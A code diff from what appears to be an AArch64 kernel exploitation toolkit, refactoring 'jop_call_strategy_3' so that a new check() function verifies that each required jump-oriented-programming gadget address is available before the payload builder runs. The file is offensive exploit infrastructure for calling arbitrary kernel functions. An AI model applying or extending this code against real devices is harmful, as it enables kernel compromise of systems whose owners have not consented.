@@ -405,43 +405,33 @@
 #include "aarch64/jop/call_strategy.h"
 #include "aarch64/jop/gadgets_static.h"
 
-#include <unistd.h>
+#include <unistd.h> // for ssize_t
 
-#define NEED(block, gadget)	((uint64_t)1 << (gadget - 64 * block))
-
-static const uint64_t gadgets_0 =
-	  NEED(0, GADGET_PROLOGUE_1)
-	| NEED(0, LDP_X2_X1_X1__BR_X2)
-	| NEED(0, MOV_X23_X0__BLR_X8)
-	| NEED(0, GADGET_INITIALIZE_X20_1)
-	| NEED(0, MOV_X25_X0__BLR_X8)
-	| NEED(0, GADGET_POPULATE_1)
-	| NEED(0, MOV_X19_X9__BR_X8)
-	| NEED(0, MOV_X20_X12__BR_X8)
-	| NEED(0, MOV_X21_X5__BLR_X8)
-	| NEED(0, MOV_X22_X6__BLR_X8)
-	| NEED(0, MOV_X0_X3__BLR_X8)
-	| NEED(0, MOV_X24_X4__BR_X8)
-	| NEED(0, MOV_X8_X10__BR_X11)
-	| NEED(0, GADGET_CALL_FUNCTION_1)
-	| NEED(0, GADGET_STORE_RESULT_1)
-	| NEED(0, GADGET_EPILOGUE_1);
-
-static void build(uint64_t, const uint64_t[8], kaddr_t,
-		void *, struct jop_call_initial_state *, uint64_t *);
-
-/*
- * jop_call_strategy_3
- *
- * Description:
- * 	The JOP payload described at the top of this file.
- *
- * Capabilities:
- * 	Supports 8 arguments passed in registers and 48 bytes of stack arguments.
- */
-struct jop_call_strategy jop_call_strategy_3 = {
-	{ gadgets_0 }, 0x300, 0x30, build,
-};
+static bool
+check() {
+#define NEED(gadget)					\
+	if (static_gadgets[gadget].address == 0) {	\
+		return false;				\
+	}
+	NEED(GADGET_PROLOGUE_1);
+	NEED(LDP_X2_X1_X1__BR_X2);
+	NEED(MOV_X23_X0__BLR_X8);
+	NEED(GADGET_INITIALIZE_X20_1);
+	NEED(MOV_X25_X0__BLR_X8);
+	NEED(GADGET_POPULATE_1);
+	NEED(MOV_X19_X9__BR_X8);
+	NEED(MOV_X20_X12__BR_X8);
+	NEED(MOV_X21_X5__BLR_X8);
+	NEED(MOV_X22_X6__BLR_X8);
+	NEED(MOV_X0_X3__BLR_X8);
+	NEED(MOV_X24_X4__BR_X8);
+	NEED(MOV_X8_X10__BR_X11);
+	NEED(GADGET_CALL_FUNCTION_1);
+	NEED(GADGET_STORE_RESULT_1);
+	NEED(GADGET_EPILOGUE_1);
+	return true;
+#undef NEED
+}
 
 static void
 build(uint64_t func, const uint64_t args[14], kaddr_t kernel_payload,
@@ -551,3 +541,16 @@ build(uint64_t func, const uint64_t args[14], kaddr_t kernel_payload,
 	// Set the address at which the result will be stored.
 	*result_address = kernel_RESULT;
 }
+
+/*
+ * jop_call_strategy_3
+ *
+ * Description:
+ * 	The JOP payload described at the top of this file.
+ *
+ * Capabilities:
+ * 	Supports 8 arguments passed in registers and 48 bytes of stack arguments.
+ */
+struct jop_call_strategy jop_call_strategy_3 = {
+	0x300, 0x30, check, build,
+};
